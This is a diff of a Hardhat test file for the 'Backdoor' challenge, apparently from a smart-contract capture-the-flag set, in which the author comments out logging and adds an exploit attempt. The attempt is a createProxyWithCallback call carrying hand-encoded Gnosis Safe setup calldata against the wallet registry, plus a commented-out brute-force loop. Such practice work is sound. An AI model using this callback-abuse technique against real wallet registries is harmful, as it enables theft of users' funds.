@@ -22,9 +22,9 @@ describe('[Challenge] Backdoor', function () {
         // await this.gnosisSafeProxy.deployed();
         await this.walletFactory.deployed();
         await this.token.deployed();
-        console.log("masterCopy", this.masterCopy.address);
-        console.log("walletFactory", this.walletFactory.address);
-        console.log("token", this.token.address);
+        // console.log("masterCopy", this.masterCopy.address);
+        // console.log("walletFactory", this.walletFactory.address);
+        // console.log("token", this.token.address);
         // Deploy the registry
         this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
             this.masterCopy.address,
@@ -32,7 +32,8 @@ describe('[Challenge] Backdoor', function () {
             this.token.address,
             users
         );
-        console.log("walletRegistry", this.walletRegistry.address);
+        // console.log(await this.walletRegistry.test())
+        // console.log("walletRegistry", this.walletRegistry.address);
         // https://www.youtube.com/watch?v=GHyxe32Z814
         // Users are registered as beneficiaries
         for (let i = 0; i < users.length; i++) {
@@ -60,10 +61,21 @@ describe('[Challenge] Backdoor', function () {
         // await attackContract.deployed();
         // console.log(await attackContract.attack())
 
-        console.log(selector.getSighash(functionFragment));
-        const tnx = await this.walletFactory.connect(alice).createProxyWithCallback(this.masterCopy.address, "0xb63e800d" , 0, this.walletRegistry.address);
+        // console.log(selector.getSighash(functionFragment));
+        let val = "0xb63e800d";
+        // while (true) {
+        //     val += "01";
+        //     try{
+        //         const tnx = await this.walletFactory.connect(alice).createProxyWithCallback(this.masterCopy.address, "0xb63e800d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" , 0, this.walletRegistry.address, {gasLimit: 30_000000});
+        //         console.log(val);
+        //         break;
+        //     }
+        //     catch (e){}
+        //
+        // }
+        const tnx = await this.walletFactory.connect(alice).createProxyWithCallback(this.masterCopy.address, "0xb63e800d00000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000000000000000000000000000000000000000000160000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb2000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000" , 0, this.walletRegistry.address, {gasLimit: 30_000000});
         const data = await tnx.wait();
-        console.log(data);
+        // console.log(data);
     });
 
     after(async function () {
